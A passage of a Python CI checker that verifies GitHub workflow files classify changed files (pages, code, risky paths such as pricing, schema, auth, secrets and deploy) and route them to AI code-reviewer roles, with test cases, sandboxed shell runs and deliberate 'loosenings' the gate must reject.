        try:
            text = _read(path)
        except OSError as e:
            print("  wiring: %s" % e)
            return 1
        if read_faults(text):
            return 1  # the wiring checks say what; a loosened copy proves nothing here
        for what, loosen in READ_LOOSENINGS:
            changed = loosen(text)
            if changed == text:
                print("  wiring: the loosening '%s' no longer applies to %s — rewrite it against "
                      "the file as it stands, or it proves nothing" % (what, path))
                bad += 1
            elif not read_faults(changed):
                print("  wiring: %s with %s passes the read hold — the guard for it is gone"
                      % (path, what))
                bad += 1
    if not bad:
        print("ok: each reviewer's read stops at a minute of its job, counted from the job's "
              "first step and at least %d inside its limit, and names why it did not read; the "
              "deadline was run in %d case(s) and `why()` in %d, and each of %d loosenings of each "
              "file was refused" % (READ_MARGIN, len(DEADLINE_CASES), len(WHY_CASES),
                                    len(READ_LOOSENINGS)))
    return bad


# THE CLASS A CHANGE IS READ AT, AND WHAT A READ OF IT IS GIVEN. #77's reads
# ran out of time twice at max, each preloading every file in this repository
# (#70's slice 2), and decision 0005 kept max for the risky classes alone,
# until his ruling of 28 September 2026 put every read at max: the class now
# picks the role, and so the model, and never the effort. So
# each reviewer works out a class from the diff it reads: `words` when every
# file the change touches is a page, `code` otherwise, and `risky` when any
# file it touches is in one of the six risky classes. The brief, AGENTS.md at
# any depth, is never a page: it instructs the reviewer or an agent, so a change
# to it changes a reader. Nor are the pages whose words are law here:
# HOW-WE-BUILD.md and CHARTER.md at the root (twice on 9 September a trim
# weakened what the operating page required, and a reader caught it where no
# machine could: #79's first read), RICH-DATA.md's data rules and the capped
# design/SCREEN-LAW.md (#79's third read), and a product's PRODUCT.md and
# design/CONSTITUTION.md (#79's fourth and sixth reads). Nor is anything in a
# dot-directory, where .github and .claude keep settings and agents'
# instructions whatever their extension.
# The README and the library are pages again (decision 0008's PR 0): since #102
# the README is a map and the library one topic a page, and #102's own
# words-only change, read as code, was handed every file, 528,728 bytes. The list splits renames, so a script renamed to a page is still a script, and is
# NUL-separated, so no name is read as two. It is written to a file first, so a
# list that cannot be made stops the step: read through `< <(...)` it failed
# unseen and read as no change at all, which is pages. The block is run, not read, against
# the changes below, from its first line to the one output that hands the
# effort to the read, so any line added inside it is run too.
#
# RISKY, BY NAME (#86). The six classes decision 0005 and the operating page's
# step 5 name are read by reviewer-risky, and ordinary code by reviewer-main with
# everything it was given before. A file is risky by its path, lower-cased, so
# a name's case cannot hide it: the gate's own files and the brief whatever
# their extension, then, for anything that is not a page, a name that says
# pricing, live data or schema, sign-in or permissions, a public trust boundary
# (every endpoint under an `api/` is one: it is where the internet meets the
# data), or deploy and release (every script, and what a build installs). A
# page is never risky by its name: a screen spec called garment-pricing.md is
# words about pricing, and the diff shows what it says. The names are a rule,
# not a proof, so an ordinary read is told it was not read as risky, and a reader
# that finds a risky change the names missed says so as a finding — which
# puts the name in this list. Replayed before it merged, on the files each
# merged pull request touched: of Hemz OS's last 72, 46 read risky and 26
# ordinary; of this repository's last 57, 28 risky and 29 ordinary.
CLASS_FIRST = "class=words"
CLASS_RISK_FIRST = "risky=no"
CLASS_CODE = ("AGENTS.md|*/AGENTS.md|HOW-WE-BUILD.md|CHARTER.md|RICH-DATA.md|design/*|"
              "PRODUCT.md|.*|*/.*) class=code ;;")
CLASS_ARMS = (CLASS_CODE, "*.md) ;;", "*) class=code ;;")
RISK_CASE = 'case "${f,,}" in'
# The six classes, as the arms that name them, in the order they are tried.
RISK_GATE = ("agents.md|*/agents.md|check.sh|*/check.sh|review-gate.py|*/review-gate.py|board/build.py|"
             "model-registry/*|*/model-registry/*|.*|*/.*) risky=yes ;;")
RISK_PRICING = "*pric*|*payment*|*billing*|*invoice*|*checkout*|*quote*) risky=yes ;;"
RISK_DATA = ("*.sql|*migration*|*schema*|supabase/*|*/supabase/*|*backfill*|*purge*|*truncate*|"
             "*wipe*|*seed*) risky=yes ;;")
RISK_SIGN_IN = "*auth*|*login*|*logout*|*session*|*password*|*permission*) risky=yes ;;"
# Decision 0008's prerequisite: customer or personal data access, export and
# deletion; secrets and credentials.
RISK_PERSONAL = ("*customer*|*personal*|*pii*|*gdpr*|*privacy*|*export*|*delet*|*erase*|"
                 "*anonymi*) risky=yes ;;")
RISK_SECRETS = "*secret*|*credential*|*token*|*.pem|*.key|*.p12|*.pfx|*.env|*.env.*) risky=yes ;;"
RISK_BOUNDARY = "api/*|*/api/*|*middleware*|*webhook*|sw.js|*/sw.js) risky=yes ;;"
RISK_RELEASE = ("*.sh|*.toml|*deploy*|*vercel.json|*dockerfile*|*package.json|*lock.json|*.lock|"
                "*lock.yaml) risky=yes ;;")
# AND IT FAILS CLOSED (decision 0008, rule 3): a file is ordinary only when its
# kind is one the list knows, and anything else — no extension, a certificate,
# a config format nobody named — is read as risky. It started at "not risky"
# and flipped only on a name, so a kind nobody had thought of was read at high.
RISK_ORDINARY = ("*.js|*.mjs|*.cjs|*.jsx|*.ts|*.tsx|*.py|*.html|*.css|*.scss|*.json|*.txt|"
                 "*.csv|*.svg|*.png|*.jpg|*.jpeg|*.gif|*.webp|*.ico|*.woff|*.woff2) ;;")
RISK_UNKNOWN = "*) risky=yes ;;"
RISK_ARMS = (RISK_GATE, "*.md) ;;", RISK_PRICING, RISK_DATA, RISK_SIGN_IN, RISK_PERSONAL,
             RISK_SECRETS, RISK_BOUNDARY, RISK_RELEASE, RISK_ORDINARY, RISK_UNKNOWN)
CLASS_RISKY = '[ "$risky" = no ] || class=risky'
CLASS_ROLE = ('case "$class" in words|code) role=%s ;; *) role=%s ;; esac'
              % (ORDINARY_ROLE, RISKY_ROLE))
CLASS_OUT = 'echo "role=$role" >> "$GITHUB_OUTPUT"'
CLASS_LIST = {
    REVIEW_WORKFLOW: ('git diff -z --name-only --no-renames "origin/${{ github.event.repository'
                      '.default_branch }}...${{ steps.head.outputs.sha }}" > "$RUNNER_TEMP/changed.txt"',
                      'done < "$RUNNER_TEMP/changed.txt"'),
    PRODUCT_WORKFLOW: ('g diff -z --name-only --no-renames "origin/$MAIN...$SHA" > "$t/changed.txt"',
                       'done < "$t/changed.txt"'),
}
# The read is handed the class's role and nothing else; the effort and the
# model are resolved from the registry inside the read, never passed in.
ROLE_IN = "ROLE: ${{ steps.gather.outputs.role }}"
EFFORT_GUARD = ('case "$EFFORT" in %s) ;; *) fail "the registry set no effort a reviewer may '
                'read at" ;; esac' % REVIEW_EFFORT)
READ_EFFORT = '--effort "$effort"'
READ_MODEL = '--model "$model"'
# An ordinary read is told so, in both reviewers, and asked to say if a file it
# was shown is in a risky class after all: without it, a name the list missed
# is read by reviewer-main, not reviewer-risky, in silence. It was keyed on the
# effort while the two classes read at two; with one effort, on the class.
RISK_TOLD = ('if [ "$CLASS" != risky ]; then',
             'echo "release machinery, or the review gate, that is a finding: say which file, so its '
             'name joins the rule."')
# review.yml's pages (decision 0014, F(1) and the context pilot): a risky
# change is given every page whole and the registry with them, as every
# non-page read was before; a words or code change is given model-registry/
# context.py's selection — HOW-WE-BUILD.md, the README's index, each touched
# file, its partners both ways, every page naming one, and on a code read the
# registry. What is left out is named with its size, and the reviewer is told
# so and how to ask for it: without those, a read short of a file is silent
# about it. The selector is main's, and the block is run, not read, on a
# made-up tree below, with the real selector.
CONTEXT = "model-registry/context.py"
REVIEW_SELECT = ('git show "origin/${{ github.event.repository.default_branch }}:model-registry/context.py" '
                 '> "$RUNNER_TEMP/context.py"',
                 'python3 "$RUNNER_TEMP/context.py" "$class" "$RUNNER_TEMP/changed.txt" /tmp/diff.txt /tmp/pages.txt')
PAGES_FIRST = ": > /tmp/pages.txt"
PAGES_TREE = {
    "AGENTS.md": "the brief, naming HOW-WE-BUILD.md\n",
    "CHARTER.md": "the charter\n",
    "HOW-WE-BUILD.md": "the operating page\n",
    "README.md": ("# map\n\n## Where each topic lives\n\n| `library/reviewer.md` | x |\n| `library/deploy.md` | y |\n"
                  "| `library/rulebook-files.md` | z |\n\n## Changing the rulebook\n\nIt names CHARTER.md.\n"),
    "check.sh": "echo the guard\n",
    "review-gate.py": "def read_faults():\n    pass\n\n\ndef other():\n    pass\n",
    "library/deploy.md": "Scope: x. Open when: y.\n\nIt follows HOW-WE-BUILD.md.\n",
    "library/reviewer.md": "Scope: x. Open when: y.\n",
    "library/rulebook-files.md": "Scope: x. Open when: y.\n",
    ".github/workflows/review.yml": "name: Review\n",
    "model-registry/registry.json": "{}\n",
    "juku-library/PAPER.md": "a paper naming HOW-WE-BUILD.md and library/reviewer.md\n",
}
# (class, the files the change touches, the files of PAGES_TREE it is given, whole or in part).
PAGES_CASES = (
    ("words", ["library/reviewer.md"], {"HOW-WE-BUILD.md", "README.md", "library/reviewer.md"}),
    ("words", ["README.md"], {"HOW-WE-BUILD.md", "README.md"}),
    ("words", ["library/reviewer.md", "library/deploy.md"],
     {"HOW-WE-BUILD.md", "README.md", "library/reviewer.md", "library/deploy.md"}),
    ("words", ["library/rulebook-files.md"], {"HOW-WE-BUILD.md", "README.md", "library/rulebook-files.md", "check.sh"}),
    ("words", ["library/reviewer.md.bak", "library/review"], {"HOW-WE-BUILD.md", "README.md"}),
    ("code", ["CHARTER.md"], {"HOW-WE-BUILD.md", "README.md", "CHARTER.md", "model-registry/registry.json"}),
    ("code", ["HOW-WE-BUILD.md"], {"HOW-WE-BUILD.md", "README.md", "check.sh", "library/deploy.md",
                                   "model-registry/registry.json"}),
    ("risky", ["check.sh"], set(PAGES_TREE)),
    ("risky", ["library/reviewer.md", "x.sql"], set(PAGES_TREE)),
)
# And the verdict says how thoroughly it was read (#79's eighth read): a clean
# read at high with pages alone must not look like one at max with everything.
# Since #86 it also says how much was read and how long the read took, so a
# slow or heavy read shows on the pull request rather than only in a log.
VERDICT_SAYS = ('title="No findings on this commit (read as $CLASS at effort $EFFORT${SPENT:+; $SPENT})"',
                'title="Advisory findings only on this commit (read as $CLASS at effort $EFFORT${SPENT:+; $SPENT})"',
                'title="Blocking findings on this commit (read as $CLASS at effort $EFFORT${SPENT:+; $SPENT})"',
                "CLASS: ${{ steps.gather.outputs.class }}", "EFFORT: ${{ steps.read.outputs.effort }}",
                "SPENT: ${{ steps.read.outputs.spent }}", "SPEND: ${{ steps.read.outputs.spend }}",
                '[ -z "${SPEND:-}" ] || printf \'\\n---\\nSpend: %s\\n\' "$SPEND" >> ')
# WHAT A READ COST, MEASURED WHERE IT HAPPENS (#86). The bytes handed to the
# model, the diff and pages with the brief, and the seconds from the call to
# its answer, recorded before a failed read is named, so a read that ran out of
# time says how much it was carrying. Each file writes its own paths.
READ_BYTES = {REVIEW_WORKFLOW: "read_bytes=$(cat /tmp/prompt.txt /tmp/system.txt | wc -c)",
              PRODUCT_WORKFLOW: 'read_bytes=$(cat "$t/prompt.txt" "$t/system.txt" | wc -c)'}
READ_BEGAN = "began=$(date +%s)"
READ_TOOK = ("took=$(( $(date +%s) - began ))",
             'echo "spent=$read_bytes bytes, $((took / 60)) min $((took % 60)) s" >> "$GITHUB_OUTPUT"')
READ_ANSWERED = '[ "$rc" -eq 0 ] || fail "$(why)"'
READ_ASK = 'ask "$ROLE" "$bound" || rc=$?'
# BLOCKING OR ADVISORY (#79's ninth read, the ninth to leave only notes it said
# should not hold the change). The brief allows two rounds and then leaves a
# trade-off standing on the pull request as the CTO's call; the gate opened only
# on a read that left nothing, so no read ever ended the rounds. The reviewer
# now marks each finding, and a read whose findings are all advisory opens the
# gate as a clean one does. The reviewer decides which is which, not the
# proposer. The signing block is run, not read, on each verdict below.
SIGN_FIRST = 'if [ "$TOO_BIG" = "yes" ]; then'
# The read takes the schema's verdicts and nothing else, in both reviewers, held
# as the block itself and against the schema's own list (#80's second read): a
# file that lagged would sign a real answer "no verdict".
VERDICT_CASE = ('case "$verdict" in', "clean|advisory|blocking) ;;",
                '*) fail "the reviewer returned no verdict: $(why)" ;;', "esac")
SIGN_CASES = (("clean", "success"), ("advisory", "success"), ("blocking", "failure"),
              ("findings", "failure"), ("", "failure"), ("Advisory", "failure"))
SIGN_SPENT = "84213 bytes, 3 min 12 s"


def sign_says(block, verdict, spent=None):
    """Run the signing block on a read that answered `verdict`. (conclusion, title), or None."""
    with tempfile.TemporaryDirectory() as d:
        open(os.path.join(d, "review.md"), "w").write("r")
        body = "\n".join(l.replace("/tmp/", d + "/").replace('"$t/', '"' + d + "/") for l in block)
        script = "set -euo pipefail\n%s\necho \"conclusion=$conclusion\"\necho \"title=$title\"\n" % body
        env = dict(os.environ, TOO_BIG="no", OUTCOME="success", WHY="", VERDICT=verdict,
                   CLASS="code", EFFORT="max")
        env.pop("SPENT", None)
        if spent is not None:
            env["SPENT"] = spent
        try:
            p = subprocess.run(["bash", "-c", script], capture_output=True, text=True, timeout=30,
                               env=env)
        except (OSError, subprocess.SubprocessError):
            return None
    c = re.search(r"^conclusion=(\w+)$", p.stdout, re.M)
    t = re.search(r"^title=(.*)$", p.stdout, re.M)
    return (c.group(1), t.group(1) if t else "") if p.returncode == 0 and c else None


def pages_says(block, cls, changed):
    """Run review.yml's pages block, with the real selector, on PAGES_TREE as a change of `cls` touching `changed`.

    (files given whole or in part, files named as left out, the count handed on), or None.
    """
    with tempfile.TemporaryDirectory() as d:
        tree = os.path.join(d, "tree")
        for f, body in PAGES_TREE.items():
            os.makedirs(os.path.dirname(os.path.join(tree, f)), exist_ok=True)
            open(os.path.join(tree, f), "w").write(body)
        try:
            for cmd in (["init", "-q"], ["add", "-A"],
                        ["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "t"]):
                subprocess.run(["git", "-C", tree] + cmd, check=True, capture_output=True, timeout=30)
            shutil.copy(CONTEXT, os.path.join(d, "context.py"))
        except (OSError, subprocess.SubprocessError):
            return None
        with open(os.path.join(d, "changed.txt"), "wb") as out:
            out.write(b"".join(p.encode("utf-8") + b"\0" for p in changed))
        with open(os.path.join(d, "diff.txt"), "w") as out:
            out.write("".join("diff --git a/%s b/%s\n@@ -1,1 +1,1 @@\n-a\n+b\n" % (f, f) for f in changed))
        body = "\n".join(l.replace("/tmp/", d + "/") for l in block)
        script = "set -euo pipefail\ncd '%s'\nclass='%s'\n%s\n" % (tree, cls, body)
        try:
            p = subprocess.run(["bash", "-c", script], capture_output=True, text=True, timeout=60,
                               env=dict(os.environ, RUNNER_TEMP=d, GITHUB_OUTPUT=os.path.join(d, "out")))
            pages = open(os.path.join(d, "pages.txt"), encoding="utf-8").read()
            count = open(os.path.join(d, "out"), encoding="utf-8").read()
        except (OSError, subprocess.SubprocessError):
            return None
    if p.returncode != 0:
        return None
    marks = re.findall(r"^===== (.+) =====$", pages, re.M)
    left = {m.split(":")[0] for m in marks if m.endswith(REVIEW_LEFT_OUT.rstrip(" ="))}
    given = {re.split(r"[,:]", m)[0] for m in marks} - left
    n = re.search(r"^left_out=(\d+)$", count, re.M)
    return given, left, int(n.group(1)) if n else None


# A thinner read that needed more says so as a finding, never as a note on a
# clean read (#79's tenth read: the high path with pages alone is unproven
# until runs show it, so it fails closed rather than pass on less).
REVIEW_LEFT_OUT = "bytes, left out: not selected for this read ====="
REVIEW_COUNT = ('echo "left_out=$(grep -cE \'^===== .+: [0-9]+ bytes, left out: not selected for this read =====$\' /tmp/pages.txt || true)" >> "$GITHUB_OUTPUT"')
REVIEW_COUNT_IN = "LEFT_OUT: ${{ steps.gather.outputs.left_out }}"
REVIEW_TOLD = ('echo "This change is read as $CLASS at effort $EFFORT with a selection of the repository:"',
               'echo "severity needs-context naming it, and you will be read once more with it."',
               "CLASS: ${{ steps.gather.outputs.class }}")
# (the files a change touches, the class it must be read as). None is a list
# git could not make, which must stop the block rather than read as anything.
CLASS_CASES = (
    (None, None),
    ([], "words"),
    (["README.md"], "words"),
    (["library/topics/reviewer.md"], "words"),
    (["design/ARCHITECT.md", "library/topics/reviewer.md"], "code"),
    (["docs/README.md"], "words"),
    (["docs/reviewer.md"], "words"),
    (["design/ARCHITECT.md"], "code"),
    (["design/REVIEW_RUBRIC.md", "docs/reviewer.md"], "code"),
    (["design/SCREEN_SPEC_TEMPLATE.md"], "code"),
    (["docs/HOW-WE-BUILD.md", "docs/CHARTER.md"], "words"),
    (["a page with spaces.md"], "words"),
    (["AGENTS.md"], "risky"),
    (["HOW-WE-BUILD.md"], "code"),
    (["README.md", "CHARTER.md"], "code"),
    (["README.md", "library/deploy.md"], "words"),
    (["RICH-DATA.md"], "code"),
    (["design/SCREEN-LAW.md"], "code"),
    (["design/CONSTITUTION.md", "README.md"], "code"),
    (["PRODUCT.md"], "code"),
    (["NAMES.md", "docs/guide.md"], "words"),
    (["docs/AGENTS.md"], "risky"),
    (["README.md", "check.sh"], "risky"),
    (["review-gate.py"], "risky"),
    (["board/build.py"], "risky"),
    (["check.sh"], "risky"),
    ([".github/workflows/review.yml"], "risky"),
    ([".github/copilot-instructions.md"], "risky"),
    ([".claude/skills/steward/SKILL.md"], "risky"),
    (["docs/.hidden/page.md"], "risky"),
    (["README.MD"], "code"),
    (["page.md.sh"], "risky"),
    (["page.md\nx.sh"], "risky"),
    (["supabase/migrations/0001_init.sql", "README.md"], "risky"),
    # Ordinary code, and pages whose names sound risky, stay ordinary.
    (["roadmap.json", "PRODUCT.md"], "code"),
    (["the-workshop.html", "hosting/queue.js"], "code"),
    (["hosting/test-orders.mjs"], "code"),
    (["design/screens/garment-pricing.md"], "code"),
    (["library/session-changeover.md"], "words"),
    (["docs/authoring.md"], "words"),
    # Pricing.
    (["hosting/pricing-core.js"], "risky"),
    (["src/Payments/refund.ts"], "risky"),
    (["billing.py"], "risky"),
    (["lib/invoice.rb"], "risky"),
    (["web/checkout.tsx"], "risky"),
    (["the-quote.html", "README.md"], "risky"),
    # Live data and schema.
    (["db/seed.sql"], "risky"),
    (["hosting/migrations/2026-09-24-add.js"], "risky"),
    (["prisma/schema.prisma"], "risky"),
    (["supabase/functions/index.ts"], "risky"),
    # Sign-in and permissions.
    (["src/auth/guard.ts"], "risky"),
    (["hosting/login.js"], "risky"),
    (["hosting/logout.js"], "risky"),
    (["hosting/session.js"], "risky"),
    (["reset-password.ts"], "risky"),
    (["permissions.json"], "risky"),
    # Public trust boundaries.
    (["hosting/api/orders.js"], "risky"),
    (["api/hello.js"], "risky"),
    (["hosting/middleware.js"], "risky"),
    (["stripe-webhook.js"], "risky"),
    (["hosting/shell/sw.js"], "risky"),
    (["sw.js"], "risky"),
    # Deploy and release.
    (["hosting/build.sh"], "risky"),
    (["netlify.toml"], "risky"),
    (["scripts/deploy.mjs"], "risky"),
    (["hosting/vercel.json"], "risky"),
    (["Dockerfile"], "risky"),
    (["package.json"], "risky"),
    (["hosting/package.json"], "risky"),
    (["package-lock.json"], "risky"),
    (["yarn.lock"], "risky"),
    (["pnpm-lock.yaml"], "risky"),
    # A name's case hides nothing.
    (["Hosting/Login.JS"], "risky"),
    (["SRC/PRICING.TS"], "risky"),
    (["Agents.md"], "risky"),
    # Decision 0008: it fails closed. A kind of file the list does not know is
    # risky, whatever its name.
    (["LICENSE"], "risky"),
    (["notes.xyz"], "risky"),
    (["hosting/nginx.conf"], "risky"),
    (["docker-compose.yml"], "risky"),
    (["certs/server.pem"], "risky"),
    (["assets/logo.png", "README.md"], "code"),
    # Customer or personal data access, export and deletion.
    (["hosting/customer-list.js"], "risky"),
    (["src/export-orders.ts"], "risky"),
    (["hosting/delete-account.js"], "risky"),
    (["lib/gdpr.py"], "risky"),
    (["web/Privacy.tsx"], "risky"),
    # Secrets and credentials.
    (["config/secrets.json"], "risky"),
    (["hosting/credentials.js"], "risky"),
    (["config/prod.env"], "risky"),
    (["refresh-token.ts"], "risky"),
    # Destructive data changes and backfills.
    (["scripts/backfill-orders.js"], "risky"),
    (["hosting/purge-cache.js"], "risky"),
    (["db/seed.js"], "risky"),
    # The registry and reviewer routing are the gate; pages about them are pages.
    (["model-registry/registry.json"], "risky"),
    (["model-registry/resolve.py"], "risky"),
    (["library/model-registry.md"], "words"),
    (["juku-library/CLAUDE_OPEN_WEIGHT_MODEL_ROUTING_IMPLEMENTATION.md"], "words"),
)


def _class_block(text):
    """The class block, as the stripped lines from `class=words` to the effort's output."""
    return _block(text, lambda l: l == CLASS_FIRST, lambda l: l == CLASS_OUT)


def class_says(block, cases):
    """Run the class block as each change in `cases` would. Per case, (class, role) or None.

    One shell runs them all, each case in a subshell of its own, so a block that
    fails stops only its own case; the subshell is run as a statement, never
    tested, because `set -e` is off inside anything a `&&` or `if` tests.
    """
    body = "\n".join(re.sub(r"\$\{\{[^}]*\}\}", "x", l) for l in block)
    with tempfile.TemporaryDirectory() as d:
        script = ['git() { cat "$CHANGED"; }', 'g() { cat "$CHANGED"; }']
        outs = []
        for n, paths in enumerate(cases):
            changed, out = os.path.join(d, "changed%d" % n), os.path.join(d, "out%d" % n)
            if paths is not None:
                with open(changed, "wb") as f:
                    f.write(b"".join(p.encode("utf-8") + b"\0" for p in paths))
            outs.append(out)
            # A workflow expression is not shell; the listing it names is
            # stubbed, and fails as git would when there is no list to give.
            script.append("(\nset -euo pipefail\nCHANGED='%s'\nGITHUB_OUTPUT='%s'\n%s\n)\n"
                          'echo "rc%d=$?"' % (changed, out, body, n))
        # From a file, not `bash -c`: one argument is capped at 128 KB, and a
        # block run once per case outgrew it.
        with open(os.path.join(d, "cases.sh"), "w", encoding="utf-8") as f:
            f.write("\n".join(script))
        try:
            p = subprocess.run(["bash", os.path.join(d, "cases.sh")],
                               env=dict(os.environ, RUNNER_TEMP=d, t=d, MAIN="main", SHA="0" * 40),
                               capture_output=True, text=True, timeout=120)
        except (OSError, subprocess.SubprocessError):
            return [None] * len(cases)
        said = []
        for n, out in enumerate(outs):
            ok = re.search(r"^rc%d=0$" % n, p.stdout, re.M)
            try:
                lines = open(out, encoding="utf-8").read().splitlines() if ok else []
            except OSError:
                lines = []
            got = dict(l.split("=", 1) for l in lines if "=" in l)
            said.append((got["class"], got["role"]) if "class" in got and "role" in got else None)
    return said


def class_faults(text, path):
    """What a reviewer has lost of reading a change at the effort its class names."""
    lost = []
    gather, read = _step_span(text, "Gather what the reviewer reads"), _step_span(text, "Read it")
    g = text[gather[0]:gather[1]] if gather else ""
    r = text[read[0]:read[1]] if read else ""
    block = _class_block(g)
    if block is None:
        lost.append("a class block in the gather step, from `%s` to `%s`" % (CLASS_FIRST, CLASS_OUT))
    else:
        for line in CLASS_LIST[path]:
            if line not in block:
                lost.append("the class listed from the diff it reads, NUL-separated, renames split "
                            "and written down before it is read (`%s`)" % line)
        for line in (CLASS_RISK_FIRST, CLASS_CODE, CLASS_RISKY, CLASS_ROLE):
            if line not in block:
                lost.append("`%s`" % line)
        # The shape, not only the strings (#79's ninth read): an arm added for
        # an extension no case lists would pass every case and every loosening
        # above, so each `case` holds exactly its arms and nothing else.
        for first, want in (('case "$f" in', CLASS_ARMS), (RISK_CASE, RISK_ARMS)):
            try:
                start = block.index(first) + 1
                arms = block[start:block.index("esac", start)]
            except ValueError:
                arms = None
            if arms != list(want):
                lost.append("a `%s` of exactly %d arms, %s (it has %s)"
                            % (first, len(want), " / ".join("`%s`" % a for a in want), arms))
        for (paths, want), got in zip(CLASS_CASES, class_says(block, [c[0] for c in CLASS_CASES])):
            need = want and (want, RISKY_ROLE if want == "risky" else ORDINARY_ROLE)
            if got != need:
                lost.append("%s (it was %s)"
                            % ("a change to %r read as %s at %s" % ((paths,) + need) if need
                               else "a list that could not be made stopping the step",
                               "%s at %s" % got if got else "not run to an answer"))
    if len([l for l in g.splitlines() if "role=" in l and "GITHUB_OUTPUT" in l]) != 1:
        lost.append("one line, and only one, handing the role on (`%s`)" % CLASS_OUT)
    if [l for l in g.splitlines() if "effort=" in l and "GITHUB_OUTPUT" in l]:
        lost.append("no effort handed on by the class: the registry sets it for the role")
    if len(re.findall(r"^\s*ROLE:", r, re.M)) != 1 or ROLE_IN not in r or re.search(r"^\s*EFFORT:", r, re.M):
        lost.append("`%s` as the read's one role, and no effort handed to it" % ROLE_IN)
    if EFFORT_GUARD not in r or READ_CALL not in r or r.index(EFFORT_GUARD) > r.index(READ_CALL):
        lost.append("`%s` before the call" % EFFORT_GUARD)
    if [f for f in (_call(text) or []) if f.startswith("--effort")] != [READ_EFFORT + " \\"]:
        lost.append("`%s` as the call's one effort" % READ_EFFORT)
    if [f for f in (_call(text) or []) if f.startswith("--model")] != [READ_MODEL + " \\"]:
        lost.append("`%s` as the call's one model" % READ_MODEL)
    if not all(line in r for line in RISK_TOLD):
        lost.append("an ordinary read told so and asked to name a risky file (`%s`)"
                    % "`, `".join(RISK_TOLD))
    # What the read cost: counted before the call, timed around it, and handed
    # on before a failed read is named, so a read that ran out of time says too.
    held = [l.strip() for l in r.splitlines()]
    order = [READ_BYTES[path], READ_BEGAN, READ_ASK, READ_TOOK[0], READ_TOOK[1], READ_ANSWERED]
    at = [held.index(l) if l in held else -1 for l in order]
    if -1 in at or at != sorted(at) or sum(1 for l in held if l.startswith("echo \"spent=")) != 1:
        lost.append("the bytes read and the minutes taken, measured around the call and handed on "
                    "before a failed read is named (`%s`)" % "`, `".join(order))
    if _block(r, lambda l: l == VERDICT_CASE[0], lambda l: l == "esac") != list(VERDICT_CASE):
        lost.append("the read taking exactly the verdicts `%s`" % VERDICT_CASE[1])
    # THE VERDICT IS DERIVED (decision 0014, position C): the schema asks the
    # model for typed findings and a review, and for no verdict, so the one
    # verdict the read takes, `clean|advisory|blocking`, is the one ask.py's derive() makes.
    try:
        schemas = [json.loads(x) for x in SCHEMA.findall(text)]
    except ValueError:
        schemas = None
    if schemas != [FINDINGS_SCHEMA]:
        lost.append("the read asking the model for typed findings and a review, and for no verdict of its own "
                    "(the schema `%s`)" % json.dumps(FINDINGS_SCHEMA, separators=(",", ":")))
    sign = _step_span(text, "Sign the verdict")
    sg = text[sign[0]:sign[1]] if sign else ""
    for line in VERDICT_SAYS:
        if line not in sg:
            lost.append("the verdict naming the class and effort it was read at, and what the read "
                        "cost (`%s`)" % line)
    block = _block(sg, lambda l: l == SIGN_FIRST, lambda l: l == "fi")
    for verdict, want in SIGN_CASES:
        got = sign_says(block, verdict) if block else None
        if (got and got[0]) != want:
            lost.append("a read answering %r signed %s (it was signed %s)"
                        % (verdict, want, got and got[0]))
    for verdict in ("clean", "advisory", "blocking"):
        got = sign_says(block, verdict, SIGN_SPENT) if block else None
        if not got or not got[1].endswith("; %s)" % SIGN_SPENT):
            lost.append("a %s read's verdict saying what it cost (it said %r)"
                        % (verdict, got and got[1]))
    if path == REVIEW_WORKFLOW:
        pages = _block(g, lambda l: l == PAGES_FIRST, lambda l: l == REVIEW_COUNT)
        if REVIEW_SELECT[0] not in g or not pages or REVIEW_SELECT[1] not in pages:
            lost.append("the selector read from the protected branch and run on the class (`%s`)"
                        % "`, `".join(REVIEW_SELECT))
        for cls, changed, want in PAGES_CASES:
            got = pages_says(pages, cls, changed) if pages else None
            need = (want, set(PAGES_TREE) - want, len(PAGES_TREE) - len(want))
            if got != need:
                lost.append("a %s change to %r given %s and the rest named as left out "
                            "(it was %s)" % (cls, changed, sorted(want), got))
    if path == REVIEW_WORKFLOW and REVIEW_COUNT not in g:
        lost.append("each file left out of a read named with its size and counted (`%s`)" % REVIEW_COUNT)
    say = _step_span(text, "Say it where people read")
    sy = text[say[0]:say[1]] if say else ""
    if path == REVIEW_WORKFLOW and (REVIEW_COUNT not in g or REVIEW_COUNT_IN not in sy):
        lost.append("the files left out counted where they are named and handed to the comment "
                    "(`%s`, `%s`)" % (REVIEW_COUNT, REVIEW_COUNT_IN))
    if path == REVIEW_WORKFLOW and not all(line in r for line in REVIEW_TOLD):
        lost.append("the reviewer told what was left out and asked to say if it needed it (`%s`)"
                    % "`, `".join(REVIEW_TOLD))
    return lost


def _without_arm(arm):
    """A loosening that takes one risky class's arm out of the risk `case`."""
    return lambda t: t.replace("              %s\n" % arm, "", 1)


# Each must turn the hold red on both reviewers' files (or on the one it names).
CLASS_LOOSENINGS = (
    ("a script read as a page", None, lambda t: t.replace("              *.md) ;;\n", "              *.md|*.sh) ;;\n", 1)),
    ("the brief read as a page", None, lambda t: t.replace(CLASS_CODE, CLASS_CODE.replace("AGENTS.md|*/AGENTS.md|", "", 1), 1)),
    ("the operating page read as a page", None, lambda t: t.replace(CLASS_CODE, CLASS_CODE.replace("HOW-WE-BUILD.md|", "", 1), 1)),
    ("the charter read as a page", None, lambda t: t.replace(CLASS_CODE, CLASS_CODE.replace("CHARTER.md|", "", 1), 1)),
    ("the data rules read as a page", None, lambda t: t.replace(CLASS_CODE, CLASS_CODE.replace("RICH-DATA.md|", "", 1), 1)),
    ("the design pages read as pages", None, lambda t: t.replace(CLASS_CODE, CLASS_CODE.replace("design/*|", "", 1), 1)),
    ("an arm for an unlisted extension", None, lambda t: t.replace("              *.md) ;;\n", "              *.sql) ;;\n              *.md) ;;\n", 1)),
    ("the left-out count dropped", REVIEW_WORKFLOW, lambda t: t.replace("          " + REVIEW_COUNT_IN + "\n", "", 1)),
    ("blocking signed as a pass", None, lambda t: _in_step(t, "Sign the verdict", "          else\n            conclusion=failure", "          else\n            conclusion=success")),
    ("a verdict outside the schema taken", None, lambda t: _in_step(t, "Read it", VERDICT_CASE[1], "clean|advisory|blocking|findings) ;;")),
    ("a verdict in the schema refused", None, lambda t: _in_step(t, "Read it", VERDICT_CASE[1], "clean|blocking) ;;")),
    ("the schema widened past the read", None, lambda t: t.replace('"enum":["blocking","advisory","needs-context"]', '"enum":["blocking","advisory","needs-context","critical"]', 1)),
    ("any verdict read as advisory", None, lambda t: _in_step(t, "Sign the verdict", 'elif [ "$VERDICT" = "advisory" ]', 'elif [ -n "$VERDICT" ]')),
    ("a verdict that hides its effort", None, lambda t: t.replace(" (read as $CLASS at effort $EFFORT${SPENT:+; $SPENT})\"", "\"", 1)),
